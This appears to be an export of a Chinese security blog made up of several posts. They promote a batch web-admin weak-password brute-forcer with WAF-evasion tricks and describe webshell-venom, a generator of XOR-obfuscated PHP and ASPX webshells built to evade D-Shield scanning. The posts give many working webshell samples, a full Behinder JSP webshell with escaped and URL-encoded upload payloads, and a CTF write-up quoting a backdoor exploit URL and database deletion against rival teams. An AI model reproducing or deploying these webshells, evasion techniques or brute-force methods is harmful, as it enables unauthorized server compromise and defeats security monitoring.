&quot;fail_flag&quot;:&quot;请谨慎填写此项。如果填写此项，遇到里面的关键字就会退出爆破，用于dz等对爆破次数有限制的cms&quot;, &quot;alert&quot;:&quot;若为1则会打印下面note的内容&quot;, &quot;note&quot;:&quot;请保证本文件是UTF-8格式，并且请勿删除此说明&quot; &#125;]举个例子12345678910&#123; &quot;name&quot;:&quot;discuz&quot;, &quot;keywords&quot;:&quot;admin_questionid&quot;, &quot;captcha&quot;:0, &quot;exp_able&quot;:0, &quot;success_flag&quot;:&quot;admin.php?action=logout&quot;, &quot;fail_flag&quot;:&quot;密码错误次数过多&quot;, &quot;alert&quot;:0, &quot;note&quot;:&quot;discuz论坛测试&quot; &#125;其实对于dz,dedecms,phpmyadmin等框架本身的逻辑已经可以处理添加配置文件只是因为程序默认会开启万能密码爆破模块然而万能密码检测会引起大多数WAF封你的IP对于dz，dedecms这种不存在万能密码的管理系统如果开启的话不仅会影响效率，并且会被封IP所以配置文件里提供了各种自定义参数，方便用户自己设置。关于验证码验证码识别算是个大难题吧自己也写过一个带有验证码的demo，但是效果并不理想简单的验证码虽然能够识别一些，但是遇到复杂的验证码就效率极低，拖慢爆破速度并且你识别出来也不一定就有弱口令。。。所以就去掉了这个功能如果有大佬对这方面有好的想法，欢迎在github上留言或者邮箱 yzddmr6*@*gmail 联系我。总流程图一套流程下来大概是长这个亚子对比测试找了一批样本测试，跟tidesec的版本比较了一下web_pwd_common_crack 跑出来11个其中7个可以登录。4个是逻辑上的误报，跟waf拦截后的误报。webcrack 跑出来19个其中16个可以登录。2个是ecshop的误报，1个是小众cms逻辑的误报。webcrack比web_pwd_common_crack多探测出来的9个中有5个是万能密码漏洞，2个是发现的web_pwd_common_crack的漏报，2个是动态字典探测出来的弱口令。最后这个项目断断续续写了半年吧主要是世界上奇奇怪怪的网站太多了，后台登录的样式五花八门。有些是登录后给你重定向302到后台有些是给你重定向到登录失败页面有些是给你返回个登录成功，然后你要手动去点跳转后台有些直接返回空数据包。。。更神奇的是ecshop(不知道是不是所有版本都是这样)假如说密码是yzddmr6但是你输入admin888 与其他错误密码后的返回页面居然不一样。。。因为加入了万能密码模块后经常有WAF拦截，需要测试各个WAF对各个系统的拦截特征以及关键字。总的半年下来抓包抓了上万个都有了。。。。。。因为通用型爆破，可能无法做到百分百准确，可以自己修改配置文件来让webcrack更符合你的需求。项目地址https://github.com/yzddmr6/WebCrack]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>webcrack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webshell-venom 3.3 :利用随机异或免杀任意php文件]]></title>
    <url>%2Fposts%2Fwebshell-venom-3-3%2F</url>
    <content type="text"><![CDATA[前言没想到这么快就800颗星了这次算是一次比较重大的更新，具体情况请看下文。webshell-venom 3.3 更新日志代码结构优化，更清爽，方便自定义开发。减小shell体积。增加利用随机异或免杀任意php文件功能。1. 结构优化先上图吧原来因为随手写的脚本，代码其实比较乱这次整个重构了一遍，把随机的变量名随机字符串给标注了出来shell结构一目了然，方便大家自己二次开发。当然结构写的清爽也带来一些问题比如说厂商写查杀正则的时候更方便了。。。不过就像我一直强调的重要的从来不是脚本，而是思路只靠我一个人更新肯定是不行的我在脚本里提供了很多公共函数，自己稍微修改一下就可以bypass。2. 减小体积这个自己生成一下就能看得到，不讲了。12345678910&lt;?phpclass QCON&#123; function __destruct()&#123; $ARIK=&apos;cnP*lm&apos;^&quot;\x2\x1d\x23\x4f\x1e\x19&quot;; return @$ARIK(&quot;$this-&gt;DGBO&quot;); &#125;&#125;$qcon=new QCON();@$qcon-&gt;DGBO=isset($_GET[&apos;id&apos;])?base64_decode($_POST[&apos;mr6&apos;]):$_POST[&apos;mr6&apos;];?&gt;3.对任意php文件免杀这个是本文的重点，也是这次更新的重要部分，着重讲一下吧。首先区分免杀跟加密的区别加密就是让别人看不到源码免杀是绕过waf的检测，使其无法识别为木马单纯加密不一定可以免杀，但是免杀少不了加密单纯加密的话百度搜一下php在线加密，一大堆网站但是用过的都知道加密之后虽然谁都不认得了，但是D盾会报二级加密脚本二级肯定不是咱们的目的，所以就要做0级的免杀。任意文件免杀原理首先大家要知道一点:随便一个被D盾杀的妈都不认的shell，base64或者hex等编码后waf都不认得所以思路就是：先把原来的payload，给处理一遍然后通过函数调用来解密并执行payload如何调用处理的话脚本中就是用的base64那么如何调用呢其实如果用eval的话很好写，随便改一下就免杀了但是eval是一种语言结构不是函数，也就是不能像assert一样拆分就很难受自己有点强迫症，shell中不能出现eval等关键字，不然会被最简单的字符串搜索查找到shell所以就想到了assert但是问题来了，assert不能执行多句也就是说1assert(echo 1; echo 2; ); //差不多这个意思。。。最后只回显一个1，也就是只执行第一句话。但是所要免杀的php文件肯定不止一句话所以一般assert就要配合eval使用也就是assert(eval(xxx;xxx;xxx;));这种还是有eval，那我还用个鸡儿的assert。。。解决办法研究了一下，发现利用array_map+assert+eval加个数组处理就可以把eval给拆分掉了1array_map(&apos;u?ldOQ&apos;^&quot;\x14\x4c\x1f\x1\x3d\x25&quot;,array((&apos;P/f&#125;&apos;^&quot;\x35\x59\x7\x11&quot;).&quot;(base64_decode(&apos;xxxxxxxx&apos;));&quot;));上面的两个异或的字符串分别是assert跟eval哈，然后放在类里调用一下就免杀了。使用方法12python3 php-venom-3.3.py #生成免杀一句话python3 php-venom-3.3.py shell.php # 对同目录下shell.php进行免杀处理，保存在shell.php.bypass.php免杀冰蝎举个栗子，就免杀冰蝎吧。更多玩法还可以免杀我上次发的自己二次开发的大马大马地址：https://github.com/yzddmr6/BestShell200kb好像有点大。。。想减小体积的话自己加个gzin压缩吧免杀后的demo已经放到大马项目里了不足之处python的base64函数有点傻逼，不会自己检测源文件的编码方式php是世界上最好的语言我在脚本里用了 chardet 模块来探测可能的编码但是用了一下发现不能做到百分百正确识别utf8的没问题，遇到其他编码就容易乱码如果gbk乱码的话就自己手工base64一遍替换payload吧项目地址https://github.com/yzddmr6/webshell-venom]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>webshell-venom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WebCrack:一键自动化日站工具]]></title>
    <url>%2Fposts%2Fwebcrack-1%2F</url>
    <content type="text"><![CDATA[前言当初日学校内网的时候有很多后台，就想着能不能批量检测一下弱口令但是学校的后台系统种类很多，asp aspx php jsp 等等因为单个网站的爆破比较好整，直接上burp或者py脚本或者hydra好像还没有听说过批量工具想着找一找有没有现成的工具能测一测。还真发现github上有一个https://github.com/TideSec/web_pwd_common_crack好像很厉害的样子下载下来试了一下，然而结果并不如人意误报率有百分之六十吧，可以说是非常不理想。其实目前市面上各种爆破工具并不少但是要么只能爆破某个指定的管理系统,要么就是不支持批量所以自己就想着写一个万能网站批量爆破的脚本，并且在一周内进行了简单的实现。现在博客建立起来了，想着是时候来记录一下。工具简介webcrack是一款web后台弱口令批量爆破、检测工具。支持当前各大主流cms管理系统，如dz论坛,织梦,ecshop等。在url.txt中放入后台地址即可进行自动化检测。思路及过程思路其实挺简单1提取表单 -&gt; 放入数据 -&gt; 发送数据 -&gt; 判断返回内容但是实现起来的难点主要有两个1.如何从表单各种奇奇怪怪的参数跟token中准确提取用户名和密码这一栏2.如何判断是否登录成功在测试过程中发现原来世界上有那么多叼毛网站。。。写的非常不规范。。。想要兼容所有的情况实在很难。只能采取多种判断策略以及一些折中的办法尽可能考虑所有可能出现的情况。问题一：如何准确提取账号密码问题1的解决是靠大量测试后总结出来的关键字从id或者class中提取键名与字典相对比,如果存在关键字即为要爆破的用户名或密码问题二：如何判断是否登录成功主要精力都放在解决这个问题上，因为不同后台的登录的情况实在是五花八门。举个例子，有些是登录后给你重定向302到后台有些是给你重定向到登录失败页面有些是给你返回个登录成功，然后你要手动去点跳转后台有些直接返回空数据包。。。本菜鸡也不会什么机器学习什么深度学习模型。。。想要通过一个办法是不可能一劳永逸的解决这个问题的。经过大量的测试，最后使用以下三个办法大大减少了误报率1. 判断用户名跟密码的键名是否存在在跳转后的页面中2. error_length 动态检测3. 关键字黑名单检测这三个办法是我经过无数次测试才总结出来的经验。。。经过测试，准确率已经达到了百分之八十。更新日志1.0版本写出demo减小误报率增加随机UA头 随机X-Forwarded-For和 随机Client-IP1.5 版本可以通过域名生成动态字典可以探测系统是否存在因为设计缺陷而造成的万能密码漏洞代码结构优化，提高性能2.0 版本启动多进程，放弃辣鸡多线程增加special_case，可以识别部分cms，并针对结果采用指定的识别方式修复reset按钮带来的bugTO DO增加简单的验证码识别模块考虑采用协程的方式优化性能完善special_case工具截图截几张图证明一下我不是在瞎BB最后这个项目真的是倾注了我很多的心血。文章中写的简单，然而实际在测试脚本中由于世界上的各种傻屌网站实在是太多了。。。各种小问题小bug。。。每个版本自己都会手工调试成百上千次，直到达到稳定。因为担心公开后网上的hc大佬跟脚本小子用脚本瞎鸡儿乱跑所以暂时不准备向任何人公开源代码。]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>webcrack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次AWD反杀之旅]]></title>
    <url>%2Fposts%2Fone-online-awd%2F</url>
    <content type="text"><![CDATA[背景星盟团队的内部awd训练，邀请我们团队参加，然后想着也没什么事情就报名了。为什么说叫反杀之旅？因为最开始的时候由于技术师傅的手误，前两轮设置后台check扣分的时候多按了一个0，导致一次check扣了我们1000分。。。本来每个队初始分数是1000，结果我们一下变成了0，成了倒数第一。不过经过团队的紧张的补救以及多年的手速，在多扣了几百分的情况下最后追赶到了正数第二名的位置。觉得还挺有意思，所以今天写篇博客来记录下过程。比赛规则比赛时间八月十四日（今晚）晚六点四十到十点四十比赛规则（队长比赛前五分钟找我私聊拿各自的登陆密码并尽快修改）1.每个队伍分配到一个docker主机，给定ctf用户权限，通过制定的端口和密码进行连接；2.每台docker主机上运行一个web服务或者其他的服务，需要选手保证其可用性，并尝试审计代码，攻击其他队伍；3.选手可以通过使用漏洞获取其他队伍的服务器的权限，读取他人服务器上的flag并提交到平台上。每次成功攻击可获得5分，被攻击者扣除5分；有效攻击五分钟一轮；4.选手需要保证己方服务的可用性，每次服务不可用，扣除100分；服务检测五分钟一轮；5.不允许使用任何形式的DOS攻击因为是awd一般是线下赛，线上的awd确实还是第一次搞。最开始的时候以为是在他搭建的内网里，还要端口转发到本地才能打，感觉麻烦很多。后来才发现不是，就是一个外网主机开了很多docker，不同docker在不同的端口，打的时候IP都不用换，直接找端口就可以了。看了下界面还是挺炫酷的哈哈哈冷静分析拿到ssh后先登上去，改密码，保存源码，D盾扫一扫虽然我经常发帖子过D盾，但是D盾确实很厉害啊哈哈哈，在比赛中还是非常有用的老套路，被留了各种后门。因为本来预定的环境有问题，启用了备用线路，所以只有一个web一个pwn，那就慢慢看吧。第一个后门 任意命令执行文件名 api.inc.php很多文件都包含有这个文件authcheckæ¯ä¸ªarray_mapï¼ä¸é¢51è¡åè°ç¨äºè¿ä¸ªauthcheck，代码意思就是说收到数组authååbase64è§£ç ä¸éï¼ç¶åç¨authcode参数来任意命令执行那么我们就可以构造以下payload：1http://xxxxx/api.inc.php?authcode=assert&amp;auth=ZXZhbCgkX1BPU1RbJ2EnXSk7auth参数解码后是1eval($_POST[&apos;a&apos;]);就可以生成个用蚁剑连接的一句话啦附一张当时的截图最开始因为手速快，所有的人都被我们拿了flag第二个后门 一句话木马这个没什么说的后来发现他的$islogin可以随便绕过。。根本不用登陆。。第三个后门 LFI直接包含flag就可以读取第四个后门 任意文件上传主要代码1234567891011121314151617if ($mod == &quot;release&quot;)&#123;echo&apos;&lt;div class=&quot;panel panel-primary&quot;&gt;&lt;div class=&quot;panel-heading&quot;&gt;&lt;h3 class=&quot;panel-title&quot;&gt;&apos;.$xiaofu.&apos; - 上传安装包&lt;/h3&gt;&lt;/div&gt;&lt;div class=&quot;panel-body&quot;&gt;&apos;;if ($_POST[&quot;s&quot;] == 1) &#123;$extension = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);if (($length = count($extension)) &gt; 1) &#123;$ext = strtolower($extension[$length-1]);&#125;if ($ext == &quot;png&quot; || $ext == &quot;gif&quot; || $ext == &quot;jpg&quot; || $ext == &quot;jpeg&quot; || $ext == &quot;bmp&quot;) &#123;$ext = &quot;png&quot;;&#125;copy($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],ROOT. &quot;download/release/release.&quot;.$ext);$city=get_ip_city($clientip);$czip=($udata[&apos;dlip&apos;]);$user=($udata[&apos;user&apos;]);$DB-&gt;query(&quot;insert into `auth_log` (`user`,`type`,`date`,`city`,`czip`,`data`) values (&apos;&quot;.$user.&quot;&apos;,&apos;上传安装&apos;,&apos;&quot;.$date.&quot;&apos;,&apos;&quot;.$city.&quot;&apos;,&apos;&quot;.$czip.&quot;&apos;,&apos;无&apos;)&quot;);echo &quot;成功上传文件!&lt;br&gt;（请刷新安装包文件夹）&quot;;&#125;&#125;意思就是说，收到上传文件后检查后缀，然后保存。但是仔细看这一句12if ($ext == &quot;png&quot; || $ext == &quot;gif&quot; || $ext == &quot;jpg&quot; || $ext == &quot;jpeg&quot; || $ext == &quot;bmp&quot;) &#123;$ext = &quot;png&quot;;&#125;如果后缀是这么多的一种，那么变量$ext 就被赋值为png然后if语句就结束了也就是说他这个判断后缀是没什么卵用的，任意的后缀就可以跳过他这个判断继续往下执行。但是当时无法利用，因为网站权限被设置为不可写。。。也就是说你只有ssh才可以更改网站的内容。马失前蹄因为漏洞都比较简单，很快就看完了。简单说了一下分工，就让牛逼牛逼最牛逼巨佬naivekun师傅修洞，我们就开始写批量getflag脚本然后批量交flag结果突然听见naivekun师傅大叫一声卧槽看积分榜我们居然只有100分其他队都是1000起步喵喵喵？？？我眼花了吗？？？后来问kun师傅怎么修的，他说直接把参数删了。。。完 蛋，国 赛 重 现其实研究一下规则就知道，别人打你就扣5分但是你修炸了就一下扣100。。。唉，国赛就是这样被坑惨的，做题不少。。。但是越修分数越低。。。但是也不会掉这么多啊，一下成了倒数第一后来看群里才知道，由于技术师傅的手误，前两轮设置后台check扣分的时候多按了一个0，导致一次check扣了我们1000分。。。然后我们手速比较快修的比较急，刚好在扣分的第一轮没修好就被扣分了赶紧把洞重新修了一遍gg，跟别的队差1000分还打个毛啊猛男落泪.jpg搅屎翻盘之旅不过这个比赛有一点好处就是时间长，5分钟一轮，四个小时。算了算我们还是有翻盘的机会的毕竟手速快，顺便稳定了权限，基本上当时所有队伍的权限都在我们手里。分工了一下一个人稳定权限拿flag，一个人写批量脚本交flag，一个人搅屎。pwn跟web是分开的，也差不多这个样子当时自己批量getflag的截图这是一个洞的脚本，多的图就没截了然后慢慢分数就涨了上去，倒数第二还是第三吧删库跑路只靠得分不行，因为分差太小了，一轮全部拿到其他队伍的flag还没有扣得多所以就想着搅屎因为别人扣分实际上就相当于自己队伍得分搅屎本来想删站的，结果没权限，就少了很多乐趣。然后想着能不能fork炸弹啊磁盘写满啊这种后来naivekun师傅发现可以删库让整个站500哈哈哈哈快乐删库跑路图：被群里人发现了基本上把大多数队伍的库都删了个遍但是我们后来发现删库居然不扣分？？？在群里问技术原来check扣分异常。。。所以技术直接把check关了。。。好的吧，反正继续搅屎没毛病然后写个循环脚本，继续删库。。pwn也开始搅屎了附上队员blackbinary的犯罪证据直接echo fuckyou到二进制文件里这样其他队伍就无法攻击得到flag逐渐回暖后来因为搅屎比赛太过激烈我们的队伍分数在逐渐往上涨，其他大多数被删库就在往下掉最后就也不想打了，全部是自动化getflag，自动化提交了，大家也都自己干自己的事去了。附上几张当时的截图随机队名，我们是Colombia队第三了然后第二了最后结果，第二名后续在多扣1000分的情况下从倒数第一反杀到第二最后说给我们分数加上但是也没加，毕竟训练赛就当打着玩还是挺好玩的，但是中途平台bug比较多什么flag提交不上，提交频率过快然而最让我懵逼的是他平台有漏洞每个队伍的cookie居然只是队伍名的md5。。。阿伟死了最后总结一下反杀的原因还是主要靠搅屎，让其他队伍扣分不然快1000分的分差靠只有5分一个的flag很难追上不管怎么说这个线上awd还是挺有趣的操作虽然都是常规操作，但也是对团队分工合作，搅屎技术的一次综合考验特地写下这篇文章记录一下。小插曲喵喵喵？？？]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于我的星球]]></title>
    <url>%2Fposts%2Fwebshell-venom-notice%2F</url>
    <content type="text"><![CDATA[window.location.href="../../zsxq/"]]></content>
      <categories>
        <category>随便写写</category>
      </categories>
      <tags>
        <tag>webshell-venom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何优雅的把cmdshell升级为一句话]]></title>
    <url>%2Fposts%2Fcmd2bx%2F</url>
    <content type="text"><![CDATA[12019-7-11 自己发在土司的文章前言前一段时间致远OA的洞坑了不少公司自己也复现了一下 但是有个很恶心的问题就是 默认的payload是有长度限制的并且只是一个cmd的shellLinux的shell还比较灵活 但是win的来说就不太方便了特别是配合上恶心的url编码在浏览器里面遇到反斜杠就gg那么怎么把cmdshell优雅的转化为可以连接的一句话呢看了以前的帖子大概有这几个办法12345Js+cscriptCertutil +base64Win7以上还有bitsadmin Ps 等等等等Bitsadmin就不说了Certutil跟cscript远程下载其实也不错但是有两个问题1 如果主机不通外网就gg2 360会拦截综合来说都有自己的不足之处还是一句话echo最稳了自己也研究了一下 但是用echo写马有两个天坑1.win的尖括号转义Win的尖括号要用^来转义而不是反斜杠如果你要是放到引号里会把引号一起打印出来2. 沙雕url编码https://www.cnblogs.com/i80386/p/4576699.html大家可以自己去网上找一下帖子到底url编码有多混乱。。。。这里就说说python的requests模块的url编码经过测试123空格=&gt;%20%空格=&gt;%%20%20=&gt;%20也就是说 他在默认遇到百分号开头的字符串的时候 request模块会把它当做已经编码过的字符 直接发送过去但是他就带来个问题不会自动编码百分号所以你只把尖括号跟百分号转义过后的payload放到py脚本里还是不能正常执行这里偷了个懒直接找的在线网站，把它编码一遍再放到python里http://tool.chinaz.com/tools/urlencode.aspx综上：原来payload（冰蝎为例）1&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null)&#123;String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;尖括号转义=&gt;1^&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%^&gt;^&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%^&gt;^&lt;%if(request.getParameter(&quot;pass&quot;)!=null)&#123;String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%^&gt;url编码=&gt;1%5e%3c%25%40page+import%3d%22java.util.*%2cjavax.crypto.*%2cjavax.crypto.spec.*%22%25%5e%3e%5e%3c%25!class+U+extends+ClassLoader%7bU(ClassLoader+c)%7bsuper(c)%3b%7dpublic+Class+g(byte+%5b%5db)%7breturn+super.defineClass(b%2c0%2cb.length)%3b%7d%7d%25%5e%3e%5e%3c%25if(request.getParameter(%22pass%22)!%3dnull)%7bString+k%3d(%22%22%2bUUID.randomUUID()).replace(%22-%22%2c%22%22).substring(16)%3bsession.putValue(%22u%22%2ck)%3bout.print(k)%3breturn%3b%7dCipher+c%3dCipher.getInstance(%22AES%22)%3bc.init(2%2cnew+SecretKeySpec((session.getValue(%22u%22)%2b%22%22).getBytes()%2c%22AES%22))%3bnew+U(this.getClass().getClassLoader()).g(c.doFinal(new+sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3b%25%5e%3e然后写个轮子就可以批量cmd转一句话啦写了个脚本支持批量检测跟单个检测如果是1http://开头的就识别成单个xxx.txt就是批量需要设置一下脚本里面的cmdshell地址跟密码项目地址：https://github.com/yzddmr6/cmd2bxTCV: 0]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一键吊打D盾(免杀一句话无限生成)]]></title>
    <url>%2Fposts%2Fwebshell-venom%2F</url>
    <content type="text"><![CDATA[12019-7-15 自己发在土司的文章前言最近逛帖子发现好多人还在找各种免杀一句话。。。都9102年了 都不知道有webshell-venom这个东西吗。。。看来我的宣传还是不到位。。。再给大家介绍一下吧项目地址：https://github.com/yzddmr6/webshell-venom蚁剑插件版：https://github.com/yzddmr6/as_webshell_venom自己几个月前做的项目，一直到现在照样吊打各路防火墙(静态扫描)各类型免杀截图使用方法说明文档因为写的太多了全部放在doc下面包含了免杀脚本编写的思路以及一些小技巧需要的自取https://github.com/yzddmr6/webshell-venom/tree/master/doc后言我看到有很多waf的厂商已经关注了我的github本来开始项目名字叫php_xor_bypass只是php免杀脚本后来增加了asp aspx类型webshell-venom 1.0 的时候不到一周就被D盾查杀了现在是200个星，等到300个星放出下一个版本禁止用于非法用途！]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>免杀</tag>
        <tag>webshell-venom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无限免杀D盾脚本之aspx]]></title>
    <url>%2Fposts%2Fwebshell-venom-aspx%2F</url>
    <content type="text"><![CDATA[12019-7-15 自己发在土司的文章前言自己曾经写过一篇文章:利用随机异或无限免杀某盾php的webshell免杀方法有很多,但是市面上很少有讲aspx免杀的文章.因为aspx的权限一般较大,对于渗透过程中还是很重要的, 所以就想着写一篇文章来简单的介绍下aspx的免杀0x01 主要方法1234字符串拼接函数数组Base64编码0x02 了解aspx一句话Aspx的一句话一般是使用Jscript语言实现看看原本的菜刀aspx一句话1&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;其实与php的类似Eval函数将字符串当做代码执行不同的是在Jscript中为了安全起见必须使用unsafe参数,才可以使其具有对操作系统操作的功能Request.Item[“pass”] 的pass就是接受的参数 类似于php的$_POST[“pass”]Jscript基本用法1Function xxx()&#123;&#125;//声明一个函数字符串拼接12Var a =’a’+’b’;//a=’ab’;Var a= ‘\x61’; //a=’a’;数组声明12Var a=’abc’;Var b=a(0);//b=’a’;作为免杀来说一般waf杀的都是unsafe这个参数,所以我们的免杀也将从这个参数下手0x02 字符串拼接经过测试,一般来说把’unsafe’这个字符串无论是十六进制拼接还是直接大小写拼接均不可行于是想到可以采用substr函数12345678&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;%var a=Request.Form(&quot;mr6&quot;);var b=&apos;aaaunsaaaafe&apos;;var b=b.substr(3,4)+b.substr(10);eval(a,b);%&gt;0x03 数组感觉大多数waf对数组拼接并不感冒,就可以打乱顺序,利用数组进行拼接1234567&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;%var a=&apos;efasnu&apos;;var b=Request.Form(&quot;mr6&quot;);var c=a(5)+a(4)+a(3)+a(2)+a(1)+a(0);eval(b,c);%&gt;0x04 函数因为某盾对字符串拼接杀得比较厉害,放在函数里当做返回值即可123456789101112&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;%var a=Request.Form(&quot;mr6&quot;);function ok()&#123;var c=&quot;un&quot;;var b=&quot;safe&quot;;return c+b;&#125;eval(a,ok());%&gt;0x05 BASE64编码Php中经常使用base64编码来bypass,那么在aspx中如何实现呢1var res=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(‘eXpkZG1yNg==’);//res=’yzddmr6’;那么我们对于unsafe这个特征就可以使用base64编码来绕过1234567&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;%var a=Request.Form(&quot;mr6&quot;);var res=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(&apos;dW5zYWZl&apos;));eval(a,res);%&gt;0x06 总结可能是因为aspx的免杀现在还不是很多,所以waf的查杀并不是很严格,不需要太复杂就可以绕过.对于以上方法还可以连环套用,以达到混淆的效果自己写了个脚本,利用以上方法来无限生成免杀aspx的webshell已经放到了自己的项目webshell_venom中项目地址:https://github.com/yzddmr6/webshell-venom]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>免杀</tag>
        <tag>webshell-venom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用随机异或无限免杀d盾]]></title>
    <url>%2Fposts%2Fwebshell-venom-1-0%2F</url>
    <content type="text"><![CDATA[1自己三个月前在圈子发的文章，保存一下前言最近D盾更新了,在某司某圈也看到了不少免杀d盾免杀狗的一句话帖子但是基本上只要放出来不到两天时间就加入查杀全家桶.最近一直在造各种车轮子就想着其实可以写个脚本利用异或来fuzz出指定的字符然后拼接出assert或者create_function等函数,来对抗waf的检测.思路及实现首先如何fuzz的问题先讲一个离散数学中的概念叫可逆 ,异或的运算就是具有可逆性的.具体什么意思呢,就是说若ab=c，则有bc=a所以只要把需要拼凑出来的字符串a跟随机取出来的符号b异或,然后出来的结果c就是需要跟b异或的内容.举个例子我们来echo一下字符a跟符号*异或的结果是大写字母K然后把大写K跟*异或就出来了我们想要的a那么也就是1a=K^*但是在写的过程中问题来了很多时候异或出来的字符是不可见的小方块就需要把它编码看了以前有一篇文章是用url编码但是在实现过程中发现url编码也有一定概率出现不可表示的字符那就开开心心上hex吧最终成功拼接出来了assert接下来就是写个字符串池子,用来存特殊符号,然后随机取出来进行异或,拼接想要的字符.把它封装成函数可以设置需要异或的字符串长度其实也可以用中文甚至emoji表情来异或,但是考虑到乱码还有不同系统对表情的支持不同,就算了.取出拼接好的assert,把get的数据传进去,就成了下面这样哈,看来可以使用啦接着是调用的问题,其实到了这个地步不管你什么d盾安全狗已经认不出来函数里面写的什么意思了但是他会根据函数的调用来检测拦截如果这个时候直接调用的话会爆一级可疑函数.既然做免杀肯定要0级了啦放到类里面再调用就好了接下来就是造轮子了在脚本中为了增大waf识别的难度 类名方法名也随机化了.使用方法右键查看生成的源码已经保存到同目录下1.php里面了生成了十几个附上过D截图最后脚本特点有三个一利用特殊符号异或达到迷惑waf的目的,并且因为每一次的拼接都是随机生成的,所以单单一个文件进了特征库也不用担心二是利用类调用,类名函数名随机化,杀软分析起来可能跟普通的文件没有什么区别三是没有assert eval create_function 等这些关键字,更为隐蔽.因为是随手写的,所以代码比较糙,不过不要在意这些细节……只是提供了一个思路,其实大马也可以像这样写个免杀模版,下一篇文章再讲吧虽然都是随机化,也没有assert eval 这种关键字,但是用的人多了当然脚本的免杀性也失效了,可以关注我的github:https://github.com/yzddmr6以后更新的免杀脚本都会放在上面.如果有什么讲的不对的地方还请大佬们多多包涵.源码地址https://github.com/yzddmr6/webshell-venom]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>免杀</tag>
        <tag>webshell-venom</tag>
      </tags>
  </entry>
</search>
